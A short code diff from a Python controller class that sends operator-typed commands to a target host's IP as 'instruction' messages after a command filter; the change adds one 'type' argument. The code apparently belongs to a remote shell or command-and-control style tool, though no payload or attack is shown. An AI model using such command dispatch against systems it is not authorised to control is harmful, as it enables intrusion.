@@ -170,7 +170,7 @@ class Controller(Host):
                     break
                 # Runs a command filter on it to make sure it's not a command that wont work
                 elif len(cmd) != 0 and not self.filter_commands(cmd):
-                    self.send(ip=target['ip'], command="instruction", data=cmd.encode(), target_id=target['id'])
+                    self.send(ip=target['ip'], command="instruction", data=cmd.encode(), target_id=target['id'], type=0)
                 else:
                     shell_lock.value = False
 
